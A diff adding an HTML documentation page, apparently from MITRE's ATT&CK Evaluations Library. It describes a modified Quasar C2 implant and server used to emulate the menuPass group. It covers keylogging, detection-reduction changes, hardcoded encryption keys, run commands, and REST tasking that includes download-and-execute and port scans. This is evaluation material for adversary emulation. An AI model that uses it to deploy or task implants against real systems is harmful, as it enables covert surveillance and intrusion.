@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771968189966">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Quasar (Modified)</title>
+    <meta name="title" content="Quasar (Modified)">
+    <meta name="description" content="This modified fork of Quasar builds on the existing Quasar C2 framework by MaxXor.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/menupass/resources/quasar/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/quasar/">
+    <meta property="og:title" content="Quasar (Modified)">
+    <meta property="og:description" content="This modified fork of Quasar builds on the existing Quasar C2 framework by MaxXor.">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/quasar/">
+    <meta property="twitter:title" content="Quasar (Modified)">
+    <meta property="twitter:description" content="This modified fork of Quasar builds on the existing Quasar C2 framework by MaxXor.">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.5.0.771968189966" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.771968189966" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.771968189966" data-turbo-eval="false" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Managed Services
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../managedservices/menupass/" class="pr-4">
+                                                menu​Pass
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Resources
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../managedservices/menupass/resources/quasar/" class="pr-4">
+                                                Quasar (Modified)
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="quasar-modified" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#quasar-modified">#</doc-anchor-trigger>
+        <span>Quasar (Modified)</span>
+    </h1>
+</doc-anchor-target>
+<p>This modified fork of Quasar builds on the existing <a href="https://github.com/quasar/Quasar/tree/bcca6010de2c3cf5780deaaed33d1f44b097d10a" class="outbound" target="_blank"><span>Quasar C2 framework</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> by MaxXor.</p>
+<ul>
+<li>The original license can be found <a href="license">here</a> and on the <a href="https://github.com/quasar/Quasar/blob/bcca6010de2c3cf5780deaaed33d1f44b097d10a/LICENSE" class="outbound" target="_blank"><span>original Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</li>
+<li>The original README can be found on the <a href="https://github.com/quasar/Quasar/blob/bcca6010de2c3cf5780deaaed33d1f44b097d10a/README.md" class="outbound" target="_blank"><span>original Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</li>
+</ul>
+<p>Several modifications have been made, including the following:</p>
+<ul>
+<li>Removed components that were not needed or used in the evaluation, to make the client more lightweight and reduce chances of detection:
+<ul>
+<li>Credential access from browsers and other password stores</li>
+<li>Batch-script functionality to restart the implant</li>
+<li>Error-handling approach to automatically restart the implant via batch script</li>
+<li>Client update functionality</li>
+<li>Client website-visiting functionality</li>
+<li>Client geolocation detection via 3rd-party websites</li>
+</ul>
+</li>
+<li>Adjusted existing IOCs
+<ul>
+<li>Assembly information</li>
+<li>File names and paths</li>
+<li>Other setting/configuration info</li>
+</ul>
+</li>
+<li>Added port scan tasking capability to the implant</li>
+<li>Added logging capabilities to the server and implant for troubleshooting (client-side logs are encrypted using AES-256-CBC and hardcoded key)</li>
+<li>Added REST API functionality to the server to programmatically manage implants</li>
+</ul>
+<doc-anchor-target id="quasar-clientimplant">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#quasar-clientimplant">#</doc-anchor-trigger>
+        <span>Quasar Client/Implant</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="features">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#features">#</doc-anchor-trigger>
+        <span>Features</span>
+    </h2>
+</doc-anchor-target>
+<p>When starting up, the client will automatically do the following:</p>
+<ul>
+<li>perform several discovery procedures</li>
+<li>start logging keystrokes</li>
+<li>connect to the C2 server</li>
+</ul>
+<p>The C2 server and other configuration settings are compiled into the implant binary, meaning that any changes will require
+the user to compile a new implant binary.</p>
+<p>Each implant is associated with a unique ID, which is calculated by taking the MD5 hash of the target hostname + target username + the target user account type.</p>
+<p>Since each implant checks for a hardcoded mutex to avoid duplicate implant sessions, you will need to rebuild an implant with
+a different mutex value if you want to have multiple implant sessions running simultaneously on a given machine.</p>
+<doc-anchor-target id="usage">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#usage">#</doc-anchor-trigger>
+        <span>Usage</span>
+    </h2>
+</doc-anchor-target>
+<p>To run the Quasar implant manually, you can simply run the implant binary:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\Client.exe</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="troubleshooting-and-logging">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#troubleshooting-and-logging">#</doc-anchor-trigger>
+        <span>Troubleshooting and Logging</span>
+    </h2>
+</doc-anchor-target>
+<p>Currently, the implant writes to a log file <code v-pre>clientmanagement.log</code> in its current working directory.
+In debug mode, the log entries are in plaintext.
+In release mode, Each log entry is a base64-encoded encrypted message.
+AES-256-CBC encryption is used with a hardcoded key: <code v-pre>cc4acde9286d68e6a540c93576d2169106d8affda5123f3dfbdf9eb2fd3278e6</code>.
+To decrypt the logs, please use the Evals c2 server utility python script <code v-pre>decryptquasarlogs.py</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 decryptquasarlogs.py -i /path/to/encrypted/logs -o out.txt</code></pre>
+</doc-codeblock></div>
+<p>Here are some potential problems that you may run into with either the Quasar server or client, and how you can go about troubleshooting them:</p>
+<ul>
+<li>Can&#x27;t start a client process
+<ul>
+<li>Check the logs to see at what point the client process terminates. Note that only one instance of a Quasar client can run on a target machine
+at a time, since Quasar checks for the global mutex.</li>
+</ul>
+</li>
+<li>Client won&#x27;t connect to the C2 server
+<ul>
+<li>Check for any error messages in the log file, and ensure your client settings are set to connect to the correct server and that
+the certificate information is correct.</li>
+</ul>
+</li>
+<li>Connection seems to hang between Quasar server and client
+<ul>
+<li>If your client process is alive, but you can&#x27;t seem to task it via API, try restarting the Quasar server so the connection can reset.</li>
+<li>In the log file output, try searching for <code v-pre>disconnect</code> to get an idea of the root cause.</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="encryption">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#encryption">#</doc-anchor-trigger>
+        <span>Encryption</span>
+    </h2>
+</doc-anchor-target>
+<p>Quasar client settings are encrypted and authenticated using AES-256-CBC and SHA256 HMAC.
+The <code v-pre>ENCRYPTIONKEY</code> setting value is used as a passphrase to derive the AES and HMAC keys via PBKDF2 (50000 iterations, SHA256 hashing function, salt value <code v-pre>b0a0f82bbff1d2b5dab062a0bfe4312e3d9efaf34cd929292bc2a93d323b09ef</code>).
+Currently, the setting value of <code v-pre>&quot;D088E59E5C03F101FFC97A8469FE5C6E3C3380EC&quot;</code> will generate the following keys:</p>
+<ul>
+<li>AES: <code v-pre>1767c472eb822fb4e012fa605a6b546389a04a4997121f4189d307fb64e94eba</code></li>
+<li>HMAC auth: <code v-pre>f7a6d3cf948610539b9991fccd858ac1a74c482e56c2c373c72157d2e4c1494de58cc18439f2dde0c3f293188072fe3f831e16ddb0d768621bba1b1705ec9f42</code></li>
+</ul>
+<p>String literal setting values in <code v-pre>Quasar.Client/Config/Settings.cs</code> are base64-encoded ciphertext blobs: HMAC(IV + ciphertext) + IV + ciphertext.
+These values are decoded and decrypted when the client starts up. Note that since these values are hardcoded, changing settings will require re-encrypting and regenerating HMAC hashes. You may use the <code v-pre>config_enc_util.py</code> utility to generate these (Note: recommended to run this script on Linux to avoid quote issues on Windows.)</p>
+<p>Usage:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 config_enc_util.py -p [ENCRYPTIONKEY password value] -i &quot;string to encrypt and encode&quot;</code></pre>
+</doc-codeblock></div>
+<p>Example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">python3 config_enc_util.py -p D088E59E5C03F101FFC97A8469FE5C6E3C3380EC -i &quot;https://www.google.com/&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="build">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#build">#</doc-anchor-trigger>
+        <span>Build</span>
+    </h2>
+</doc-anchor-target>
+<p>Built using Visual Studio and .NET 4.7.2.</p>
+<doc-anchor-target id="quasar-server">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#quasar-server">#</doc-anchor-trigger>
+        <span>Quasar Server</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="usage-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#usage-1">#</doc-anchor-trigger>
+        <span>Usage</span>
+    </h2>
+</doc-anchor-target>
+<p>To run the Quasar Server, provide the path to the certificate file as well as the IP address for the REST API server to bind to:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\Quasar.exe [-c CERT_FILE_PATH] [-ip REST_API_BIND_ADDR] [-p|port REST_API_PORT]</code></pre>
+</doc-codeblock></div>
+<p>By default, the REST API server will bind to all interfaces and listen on port 8888. If no certificate file path is provided, the Quasar
+Server will attempt to read the <code v-pre>quasar.p12</code> file from the same directory as the <code v-pre>Quasar.exe</code> binary.</p>
+<p>For example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># REST API server will only listen on 10.0.2.9:8000
+.\Quasar.exe -ip 10.0.2.9 -p 8000 -c quasar.p12
+
+# REST API server will listen on all interfaces on default port 8888
+.\Quasar.exe -c quasar.p12</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="logging">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#logging">#</doc-anchor-trigger>
+        <span>Logging</span>
+    </h2>
+</doc-anchor-target>
+<p>Server logs are written in plaintext to <code v-pre>QuasarServerLogs.txt</code> in the server&#x27;s current working directory.</p>
+<doc-anchor-target id="rest-api-functionality">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#rest-api-functionality">#</doc-anchor-trigger>
+        <span>REST API Functionality</span>
+    </h2>
+</doc-anchor-target>
+<p>The Quasar C2 server REST API was designed to be compatible with the existing Evals C2 server framework - users can use the corresponding Evals C2 handler to
+track and manage Quasar implant sessions. Typically, users will not need to make raw API requests, as the Evals C2 handler will take care of those under the hood.
+Most use cases will be satisfied by using the existing <code v-pre>evalsC2client.py</code> script.</p>
+<p>The REST API server will listen on port 8888 by default.</p>
+<p>Files that the Quasar implant uploads to the Quasar server via API tasking will be stored in the <code v-pre>uploads</code> folder in the Quasar server&#x27;s current working directory.</p>
+<p>The following endpoints and features are supported:</p>
+<doc-anchor-target id="view-existing-session-information">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#view-existing-session-information">#</doc-anchor-trigger>
+        <span>View Existing Session Information</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>GET /api/beacons</code> - fetch a JSON list of active Quasar implant sessions. The return format for a Quasar implant session dictionary is as follows:</p>
+<ul>
+<li><code v-pre>id</code>: the implant&#x27;s unique ID</li>
+<li><code v-pre>username</code>: username of the user that the implant is running under</li>
+<li><code v-pre>hostname</code>: hostname of the machine on which the implant is running</li>
+<li><code v-pre>ip_addr</code>: IP address of the machine on which the implant is running</li>
+<li><code v-pre>os</code>: target machine operating system</li>
+<li><code v-pre>account_type</code>: account type of the implant user. Possible values: <code v-pre>Admin</code>, <code v-pre>User</code>, <code v-pre>Guest</code></li>
+<li><code v-pre>tag</code>: implant tag for categorization purposes</li>
+<li><code v-pre>country_code</code>: country code of the target machine</li>
+<li><code v-pre>hardware_id</code>: hardware ID of the target machine</li>
+</ul>
+<p>Example:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># GET /api/beacons
+[
+    {
+        &quot;id&quot;: &quot;5CEF61CF22ACA6F40918643E3AAA0772&quot;,
+        &quot;username&quot;: &quot;testuser&quot;,
+        &quot;hostname&quot;: &quot;testhost&quot;,
+        &quot;ip_addr&quot;: &quot;127.0.0.1&quot;,
+        &quot;os&quot;: &quot;Windows 10 Pro 64 Bit&quot;,
+        &quot;account_type&quot;: &quot;User&quot;,
+        &quot;tag&quot;: &quot;RELEASE&quot;,
+        &quot;country_code&quot;: &quot;US&quot;,
+        &quot;hardware_id&quot;: &quot;AF67031351B51509F0C8C756CE7B1810A06783AE8750F53179FAD93023D5E585&quot;
+    }
+]</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="task-implants">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#task-implants">#</doc-anchor-trigger>
+        <span>Task Implants</span>
+    </h3>
+</doc-anchor-target>
+<p><code v-pre>GET /api/tasks/{task_id}</code> - Fetch a JSON dictionary containing information for the Quasar implant task pertaining to the given <code v-pre>task_id</code>.
+The response dictionary format varies depending on the type of task, but they will always contain the following fields:</p>
+<ul>
+<li><code v-pre>task_id</code>: string representing the task ID</li>
+<li><code v-pre>task_type</code>: int representing the task type (e.g. <code v-pre>1</code> for process creation)</li>
+<li><code v-pre>task_status</code>: int representing the task status
+<ul>
+<li><code v-pre>0</code> means that the task was carried out successfully</li>
+<li><code v-pre>1</code> means the task errored out</li>
+<li><code v-pre>2</code> means that the task is pending</li>
+</ul>
+</li>
+<li><code v-pre>task_status_msg</code>: string providing extra details on <code v-pre>task_status</code>, such as an error message for a <code v-pre>task_status</code> of <code v-pre>2</code>.</li>
+</ul>
+<p><code v-pre>POST /api/tasks</code> - create a task (non-file transfer. For file transfers, use the <code v-pre>/api/transfers</code> endpoint) for the implant to execute, such as creating a process. Requires POST data consisting of a JSON dictionary with the following fields:</p>
+<ul>
+<li><code v-pre>client_id</code>: string containing the ID of the Quasar implant to task</li>
+<li><code v-pre>task_type</code>: int representing the type of the task to execute.
+<ul>
+<li><code v-pre>1</code> for process creation</li>
+<li><code v-pre>5</code> to initiate a port scan</li>
+</ul>
+</li>
+<li>The remaining fields depend on the type of task to perform.</li>
+</ul>
+<doc-anchor-target id="process-creation-tasks">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#process-creation-tasks">#</doc-anchor-trigger>
+        <span>Process Creation Tasks</span>
+    </h3>
+</doc-anchor-target>
+<p>For process creation tasks (<code v-pre>task_type</code> of <code v-pre>1</code>), include the following fields in the POST JSON dictionary:</p>
+<ul>
+<li><code v-pre>proc_path</code>: (optional) string containing path to the binary to execute. If ommitted, <code v-pre>download_url</code> and <code v-pre>download_dst</code> will be used to determine which file to execute.</li>
+<li><code v-pre>proc_args</code>: (optional) string containing the process arguments. Multiple arguments must be combined into a single string, such as <code v-pre>&quot;/flag word1 word2&quot;</code></li>
+<li><code v-pre>download_url</code>: (optional) URL string pointing to the file to download and execute with <code v-pre>proc_args</code>, if provided. If <code v-pre>download_dst</code> is provided, the file will be saved to that path, otherwise a random name is selected with an <code v-pre>.exe</code> extension. This field is only required if <code v-pre>proc_path</code> is not provided.</li>
+<li><code v-pre>download_dst</code>: (optional) filepath string indicating where to save the file downloaded from <code v-pre>download_url</code></li>
